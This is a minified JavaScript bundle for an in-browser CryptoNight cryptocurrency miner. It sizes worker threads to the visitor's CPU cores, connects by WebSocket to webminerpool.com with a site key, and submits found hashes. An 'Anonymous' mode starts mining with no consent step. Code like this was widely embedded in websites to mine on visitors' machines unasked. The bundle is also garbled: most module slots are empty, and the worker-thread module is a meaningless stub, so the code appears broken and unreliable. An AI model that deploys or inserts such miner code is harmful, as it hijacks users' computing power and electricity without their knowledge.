!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.Client=t():e.Client=t()}(window,function(){return function(e){var t={};function i(n){if(t[n])return t[n].exports;var r=t[n]={i:n,l:!1,exports:{}};return e[n].call(r.exports,r,r.exports,i),r.l=!0,r.exports}return i.m=e,i.c=t,i.d=function(e,t,n){i.o(e,t)||Object.defineProperty(e,t,{configurable:!1,enumerable:!0,get:n})},i.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return i.d(t,"a",t),t},i.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},i.p="",i(i.s=155)}([function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){},function(e,t,i){e.exports=i(156)},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(157),r=function(e,t){if(t=t||{},this._siteKey=e,this._user=null,this._threads=navigator.hardwareConcurrency||2,this._throttle=0,this._autoThreads=!1,this._optInToken=null,this._reconnectRetry=3,this._reconnectTime=1e4,this._forceWasm=!1,this._forceASMJS=!1,this._config=n.config.CRYPTONIGHT,this._token="anonymous",this.on("error",function(){}),this.on("open",function(){}),this.on("close",function(){}),this.on("authed",function(){}),this.on("job",function(){}),this.on("found",function(){}),this.on("accepted",function(){}),this.on("optin",function(){}),"object"==typeof t)for(var i in t)t.hasOwnProperty(i)&&(this[i]=t[i]);this._autoThreads&&this.getAutoThreads(function(e){this._threads=e}.bind(this)),this._forceWasm&&!n.util.isWASMSupported()&&(this._forceWasm=!1),this._miner=null,this._socket=null,this._isPaused=!1,this._isWaitingForReconnect=!1,this._totalHashes=0,this._totalHashesMobile=0,this._hashesPerSecond=0,this._hashesPerSecondMobile=0,this._acceptedHashes=0,this._acceptedHashesMobile=0,this._threads=Math.max(1,this._threads),this._throttle=Math.max(0,Math.min(.99,this._throttle)),this.setThrottle.bind(this),this.setNumThreads.bind(this)};r.prototype.start=function(e){this._token=e||this._token,this.stop(),this._isPaused=!1,this._isWaitingForReconnect||this._startNow()},r.prototype.stop=function(){this._socket&&this._socket.close(),this._miner&&this._miner.stop(),this._isPaused=!0},r.prototype.getHashesPerSecond=function(){return this._hashesPerSecond.toFixed(1)},r.prototype.getHashesPerSecondMobile=function(){return this._hashesPerSecondMobile.toFixed(1)},r.prototype.getTotalHashes=function(e){return e?this._totalHashesMobile:this._totalHashes},r.prototype.getAcceptedHashes=function(e){return e?this._acceptedHashesMobile:this._acceptedHashes},r.prototype.getToken=function(){return this._optInToken},r.prototype.on=function(e,t){this.constructor.prototype[e]=t},r.prototype.getAutoThreads=function(e){var t=new n.JobThread;t.onmessage=function(i){t.terminate(),e(i.data.threads-1)},t.postMessage({type:"autothread"})},r.prototype.setNumThreads=function(e){this._threads=e,this._miner&&(this._miner.setNumThreads(e),this._startNow())},r.prototype.setThrottle=function(e){this._throttle=Math.max(0,Math.min(.99,e)),this._miner&&this._miner.setThrottle(e)},r.prototype._startNow=function(){this._isWaitingForReconnect||(this._socket=new n.Socket(this),this._socket.on("open",this._onOpen.bind(this)),this._socket.on("authed",this._onAuthed.bind(this)),this._socket.on("job",this._onJob.bind(this)),this._socket.on("accepted",this._onAccepted.bind(this)),this._socket.on("close",this._onClose.bind(this)),this._socket.on("error",this._onError.bind(this)),this._socket.connect())},r.prototype._onOpen=function(){this.on("open")},r.prototype._onAuthed=function(e){this._optInToken=e.token,this.on("authed",e),this.on("optin",e)},r.prototype._onJob=function(e){this._job=e,this.on("job",e),this._miner?this._miner.setJob(e):this._miner=new n.Miner(this._job,this._threads,this._throttle,this._forceWasm,this._forceASMJS),this._miner.on("found",this._onFound.bind(this)),this._miner.on("error",this._onError.bind(this)),this.setNumThreads(this._threads),this.setThrottle(this._throttle)},r.prototype._onFound=function(e){this.on("found",e),this._socket.send("submit",e)},r.prototype._onAccepted=function(e){this._acceptedHashes++,this._acceptedHashesMobile++,this.on("accepted",e)},r.prototype._onClose=function(e){this.on("close",e),this._socket.isWithError()?setTimeout(this._startNow.bind(this),this._reconnectTime):this._isWaitingForReconnect=!1},r.prototype._onError=function(e){this.on("error",e)},setInterval(function(){if(this._miner){var e=this._miner.getHashesPerSecond(),t=this._miner.getHashesPerSecondMobile();this._hashesPerSecond=.5*this._hashesPerSecond+.5*e,this._hashesPerSecondMobile=.5*this._hashesPerSecondMobile+.5*t;var i=this._miner.getTotalHashes(),n=this._miner.getTotalHashesMobile();this._totalHashes=i,this._totalHashesMobile=n}}.bind(r.prototype),1e3),r.User=function(e,t,i){var n=new r(e,i);n.start(t)},r.Anonymous=function(e,t){var i=new r(e,t);i.start("anonymous")},r.Token=function(e,t,i){var n=new r(e,i);n.start(t)},r.config=n.config,r.util=n.util,t.default=r},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.util=t.config=t.Miner=t.JobThread=t.Socket=void 0;var n=i(158);Object.defineProperty(t,"Socket",{enumerable:!0,get:function(){return r.default}});var r=function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)Object.prototype.hasOwnProperty.call(e,i)&&(t[i]=e[i]);return t.default=e,t}(n);var o=i(159);Object.defineProperty(t,"JobThread",{enumerable:!0,get:function(){return s.default}});var s=function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)Object.prototype.hasOwnProperty.call(e,i)&&(t[i]=e[i]);return t.default=e,t}(o);var a=i(160);Object.defineProperty(t,"Miner",{enumerable:!0,get:function(){return l.default}});var l=function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)Object.prototype.hasOwnProperty.call(e,i)&&(t[i]=e[i]);return t.default=e,t}(a);var d=i(161);Object.defineProperty(t,"config",{enumerable:!0,get:function(){return p.default}});var p=function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)Object.prototype.hasOwnProperty.call(e,i)&&(t[i]=e[i]);return t.default=e,t}(d);var c=i(162);Object.defineProperty(t,"util",{enumerable:!0,get:function(){return h.default}});var h=function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)Object.prototype.hasOwnProperty.call(e,i)&&(t[i]=e[i]);return t.default=e,t}(c)},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=function(e){this._client=e,this._socket=null,this._withError=!1,this.on("open",function(){}),this.on("authed",function(){}),this.on("job",function(){}),this.on("accepted",function(){}),this.on("close",function(){}),this.on("error",function(){})};n.prototype.connect=function(){var e=this._client._config.WEBSOCKET_SHARDS,t=Math.floor(Math.random()*e.length),i=e[t];this._socket=new WebSocket(i),this._socket.onmessage=this._onMessage.bind(this),this._socket.onopen=this._onOpen.bind(this),this._socket.onclose=this._onClose.bind(this),this._socket.onerror=this._onError.bind(this)},n.prototype.on=function(e,t){n.prototype[e]=t},n.prototype.send=function(e,t){var i={type:e,params:t};this._socket.send(JSON.stringify(i))},n.prototype.close=function(){this._socket.close()},n.prototype.isWithError=function(){return this._withError},n.prototype._onOpen=function(){this._withError=!1;var e={site_key:this._client._siteKey,type:"anonymous",user:null,goal:0};this._client._user&&(e.type="user",e.user=this._client._user.toString()),this.send("auth",e),this.on("open")},n.prototype._onMessage=function(e){var t;try{t=JSON.parse(e.data)}catch(e){return void this.on("error",{error:"JSON.parse() error"})}if("authed"===t.type)this._authed=!0,this._auth=t.params,this.on("authed",t.params);else if("job"===t.type)this._job=t.params,this.on("job",t.params);else if("hash_accepted"===t.type)this._hashes=t.params,this.on("accepted",t.params);else if("error"===t.type)this.on("error",t.params);else if("banned"===t.type||"invalid_site_key"===t.type||"invalid_opt_in"===t.type||"auth_required"===t.type){var i=new Error(t.params.error);i.code="connection."+t.type,this.on("error",i)}},n.prototype._onClose=function(){this.on("close",{wasClean:this._socket.isReady}),this._socket.isReady=!0},n.prototype._onError=function(e){this.on("error",{error:"Socket error"}),this._withError=!0},t.default=n},function(e,t,i){"use a=b;var c=1;"},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n=i(159),r=function(e,t,i,o,s){this._job=e,this._threads=t,this._throttle=i,this._forceWasm=o,this._forceASMJS=s,this._hashes=0,this._hashesMobile=0,this._threadsContainers=[],this.on("found",function(){}),this.on("error",function(){})};r.prototype.start=function(){this._stopThreads(),this._hashes=0,this._hashesMobile=0,this._startThreads()},r.prototype.stop=function(){this._stopThreads()},r.prototype.getHashesPerSecond=function(){for(var e=0,t=0;t<this._threadsContainers.length;t++)e+=this._threadsContainers[t].hashesPerSecond;return e},r.prototype.getHashesPerSecondMobile=function(){for(var e=0,t=0;t<this._threadsContainers.length;t++)e+=this._threadsContainers[t].hashesPerSecondMobile;return e},r.prototype.getTotalHashes=function(){return this._hashes},r.prototype.getTotalHashesMobile=function(){return this._hashesMobile},r.prototype.setJob=function(e){this._job=e},r.prototype.setNumThreads=function(e){if(e>this._threadsContainers.length){for(var t=this._threadsContainers.length;t<e;t++)this._startThread(t);this._threads=this._threadsContainers.length}else if(e<this._threadsContainers.length)for(var t=this._threadsContainers.length;t>e;t--)this._stopThread(t-1)},r.prototype.setThrottle=function(e){this._throttle=e;for(var t=0;t<this._threadsContainers.length;t++)this._threadsContainers[t].throttle=e},r.prototype.on=function(e,t){r.prototype[e]=t},r.prototype._startThreads=function(){for(var e=0;e<this._threads;e++)this._startThread(e)},r.prototype._startThread=function(e){var t=new n.JobThread;t.onmessage=this._onMessage.bind(this);var i={job:this._job,thread_id:e,forceWasm:this._forceWasm,forceASMJS:this._forceASMJS};t.postMessage(i),this._threadsContainers[e]={thread:t,isMobile:this.isMobile()}},r.prototype._stopThreads=function(){for(var e=0;e<this._threadsContainers.length;e++)this._threadsContainers[e].thread.terminate(),this._threadsContainers[e].isMobile?this._hashesMobile+=this._threadsContainers[e].hashes:this._hashes+=this._threadsContainers[e].hashes;this._threadsContainers=[]},r.prototype._stopThread=function(e){this._threadsContainers[e].thread.terminate(),this._threadsContainers[e].isMobile?this._hashesMobile+=this._threadsContainers[e].hashes:this._hashes+=this._threadsContainers[e].hashes,this._threadsContainers.splice(e,1)},r.prototype._onMessage=function(e){if(e.data.result){this.on("found",e.data.result);var t=e.data.result.thread_id;this._threadsContainers[t].isMobile?this._hashesMobile+=this._threadsContainers[t].hashes:this._hashes+=this._threadsContainers[t].hashes,this._threadsContainers[t].hashes=0}this._threadsContainers[e.data.thread_id].hashes=e.data.hashes,this._threadsContainers[e.data.thread_id].hashesPerSecond=e.data.hashesPerSecond},r.prototype.isMobile=function(){return/Mobi|Android/i.test(navigator.userAgent)},t.default=r},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var n={WEBSOCKET_SHARDS:["wss://webminerpool.com:8181"],CRYPTONIGHT_WAS_URL:"/crypto-night.wasm"};t.default={CRYPTONIGHT:n}},function(e,t,i){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.default={isWASMSupported:function(){try{if("object"==typeof WebAssembly&&"function"==typeof WebAssembly.instantiate){var e=new WebAssembly.Module(Uint8Array.of(0,97,115,109,1,0,0,0));if(e instanceof WebAssembly.Module)return new WebAssembly.Instance(e)instanceof WebAssembly.Instance}}catch(e){}return!1},isMobile:function(){return/Mobi|Android/i.test(navigator.userAgent)},GetDomain:function(e){var t=document.createElement("a");return t.href=e,t.hostname}}}]).default});